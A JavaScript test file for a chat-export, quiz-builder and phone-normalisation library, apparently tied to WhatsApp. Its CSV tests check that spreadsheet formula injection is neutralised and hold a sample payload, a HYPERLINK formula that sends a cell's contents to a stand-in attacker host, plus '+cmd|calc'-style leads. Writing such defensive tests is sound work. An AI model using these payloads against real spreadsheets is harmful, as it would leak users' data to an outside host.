// §2.193 — quizSection({ shuffle: true }) used sort(() => Math.random() - 0.5).
// §2.194 — sideBySideSurveyItem ids collided within the same millisecond.
// §2.195 — exportChatAsCSV let a chat message become a spreadsheet formula.
// Plus characterisation for three modules that had no tests at all.
import { test, describe } from 'node:test'
import assert from 'node:assert/strict'
import {
	getPollOptionHash, quizQuestion, quizSection, sideBySideSurveyItem, POLL_MIN_OPTIONS
} from '../lib/Utils/poll-extras.js'
import { exportChatAsCSV, exportChatAsJSON, exportChatAsText, chatStatistics } from '../lib/Utils/chat-export.js'
import { normalizePairingPhone } from '../lib/Utils/validate-connection.js'
import { sha256 } from '../lib/Utils/crypto.js'

const textMsg = (id, body, ts = 1757000000, pushName = 'Rina') => ({
	key: { id, remoteJid: '1@s.whatsapp.net', fromMe: false },
	pushName,
	messageTimestamp: ts,
	message: { conversation: body }
})

describe('§2.195 CSV export', () => {
	test('a message starting with = is not handed to the spreadsheet as a formula', () => {
		const payload = '=HYPERLINK("http://jahat.id/?x="&A1,"klik")'
		const row = exportChatAsCSV([textMsg('M1', payload)]).split('\n')[1]

		assert.ok(!/,=HYPERLINK/.test(row), 'the cell must not begin with a bare =')
		assert.ok(row.includes(`"'${payload.replace(/"/g, '""')}"`), 'neutralised with a leading quote, text intact')
	})

	test('the other three formula leads are covered too', () => {
		for (const lead of ['+', '-', '@']) {
			const row = exportChatAsCSV([textMsg('M1', lead + 'cmd|calc')]).split('\n')[1]
			assert.ok(row.endsWith(`'${lead}cmd|calc`), `lead ${lead} must be neutralised — got ${row}`)
		}
	})

	test('ordinary text is left exactly as it was', () => {
		const row = exportChatAsCSV([textMsg('M1', 'harga -20% hari ini')]).split('\n')[1]
		assert.ok(row.endsWith(',harga -20% hari ini'), 'a dash mid-text is not a formula')
	})

	test('RFC 4180 quoting still applies', () => {
		const csv = exportChatAsCSV([textMsg('M1', 'ada, koma dan "kutip"\nbaris dua')])
		assert.equal(csv.split('\n')[0], 'id,timestamp,fromMe,senderJid,senderName,kind,text')
		assert.ok(csv.includes('"ada, koma dan ""kutip""'), 'commas and quotes escaped')
	})
})

describe('chat export (characterisation)', () => {
	test('JSON rows are sorted ascending and carry the sender', () => {
		const rows = exportChatAsJSON([textMsg('B', 'kedua', 200), textMsg('A', 'pertama', 100)])
		assert.deepEqual(rows.map(r => r.id), ['A', 'B'])
		assert.equal(rows[0].kind, 'text')
		assert.equal(rows[0].senderName, 'Rina')
		assert.equal(rows[0].fromMe, false)
	})

	test('the transcript keeps continuation lines bare', () => {
		const out = exportChatAsText([textMsg('A', 'baris satu\nbaris dua')], { header: '' })
		const lines = out.split('\n')
		assert.match(lines[0], / - Rina: baris satu$/)
		assert.equal(lines[1], 'baris dua', 'no repeated timestamp/name, like the official export')
	})

	test('statistics count senders, kinds and top words', () => {
		const stats = chatStatistics([
			textMsg('A', 'nasi goreng enak', 100),
			textMsg('B', 'nasi uduk juga enak', 200, 'Budi')
		], { minWordLength: 4 })

		assert.equal(stats.total, 2)
		assert.deepEqual(stats.bySender, { Rina: 1, Budi: 1 })
		assert.equal(stats.byKind.text, 2)
		assert.deepEqual(stats.firstTimestamp, 100)
		assert.deepEqual(stats.lastTimestamp, 200)
		const words = Object.fromEntries(stats.topWords.map(w => [w.word, w.count]))
		assert.equal(words.enak, 2)
		assert.equal(words.nasi, 2)
		assert.equal(words.juga, 1)
	})

	test('a non-array is a TypeError, not an empty export', () => {
		assert.throws(() => exportChatAsJSON(null), TypeError)
		assert.throws(() => chatStatistics('bukan array'), TypeError)
	})
})

describe('§2.193/§2.194 quiz and survey builders', () => {
	const five = () => [1, 2, 3, 4, 5].map(n => quizQuestion('Q' + n, ['a', 'b']))

	test('shuffle produces something close to a uniform permutation', () => {
		const questions = five()
		const runs = 12000
		const landings = Array.from({ length: 5 }, () => Array(5).fill(0))

		for (let i = 0; i < runs; i++) {
			const out = quizSection('t', questions, { shuffle: true }).questions
			assert.equal(out.length, 5, 'no question may be lost')
			out.forEach((q, idx) => landings[Number(q.question.slice(1)) - 1][idx]++)
		}

		// uniform would be runs/5 in every cell. The old sort-comparator shuffle put the
		// first question first ~1.6x as often as chance and third ~0.6x; allow a generous
		// ±20% band so this is about bias, not about luck.
		const expected = runs / 5
		for (let q = 0; q < 5; q++) {
			for (let slot = 0; slot < 5; slot++) {
				const seen = landings[q][slot]
				assert.ok(Math.abs(seen - expected) < expected * 0.2,
					`Q${q + 1} landed in slot ${slot} ${seen} times, expected about ${expected}`)
			}
		}
	})

	test('shuffle does not mutate the caller\'s array', () => {
		const questions = five()
		const before = questions.map(q => q.question)
		quizSection('t', questions, { shuffle: true })
		assert.deepEqual(questions.map(q => q.question), before)
	})

	test('without shuffle the order is exactly as given', () => {
		const questions = five()
		assert.deepEqual(
			quizSection('t', questions).questions.map(q => q.question),
			['Q1', 'Q2', 'Q3', 'Q4', 'Q5']
		)
	})

	test('survey item ids are unique within the same millisecond', () => {
		const ids = new Set(Array.from({ length: 200 }, (_, i) => sideBySideSurveyItem('p' + i, 'kiri', 'kanan').id))
		assert.equal(ids.size, 200, 'ids built from Date.now() alone all collided')
	})

	test('an explicit id is still respected', () => {
		assert.equal(sideBySideSurveyItem('p', 'a', 'b', { id: 'milikku' }).id, 'milikku')
	})

	test('both sides need a label', () => {
		assert.throws(() => sideBySideSurveyItem('p', 'a', { label: '' }), /both sides need a label/)
		assert.throws(() => sideBySideSurveyItem('', 'a', 'b'), /prompt cannot be empty/)
	})

	test('quizQuestion validates the correct index against the answers', () => {
		assert.throws(() => quizQuestion('Q', ['a', 'b'], { correct: 2 }), /between 0 and 1/)
		assert.throws(() => quizQuestion('Q', ['a'], {}), new RegExp(`at least ${POLL_MIN_OPTIONS}`))
		const q = quizQuestion('Q', ['a', 'b', 'c'], { correct: 1 })
		assert.deepEqual(q.answers.map(a => a.correct), [false, true, false])
	})

	test('the exposed option hash matches the one the vote aggregator keys by', () => {
		// pattern 11: two places computing the same thing. getPollOptionHash() promises
		// parity with getAggregateVotesInPollMessage()'s bucket key — pin it, because the
		// day they drift every vote lands in an "Unknown" bucket.
		const name = 'Nasi goreng'
		assert.equal(String(getPollOptionHash(name)), sha256(Buffer.from(name)).toString())
		assert.equal(getPollOptionHash(name, 'hex'), sha256(Buffer.from(name)).toString('hex'))
		assert.throws(() => getPollOptionHash(123), /must be a string/)
	})
})

describe('normalizePairingPhone (characterisation)', () => {
	test('punctuation and the 00 call prefix are stripped', () => {
		assert.equal(normalizePairingPhone('+62 812-3456-789'), '628123456789')
		assert.equal(normalizePairingPhone('0062812345678'), '62812345678')
	})

	test('a local number is rejected with an explanation, not sent and silently dropped', () => {
		assert.throws(() => normalizePairingPhone('08123456789'), /LOCAL number/)
	})

	test('junk and over-long numbers are rejected', () => {
		assert.throws(() => normalizePairingPhone('abc'), TypeError)
		assert.throws(() => normalizePairingPhone('12345'), /full international number/)
		assert.throws(() => normalizePairingPhone('6281234567890123'), /at most 15/)
		assert.throws(() => normalizePairingPhone(null), /full international number/)
	})
})
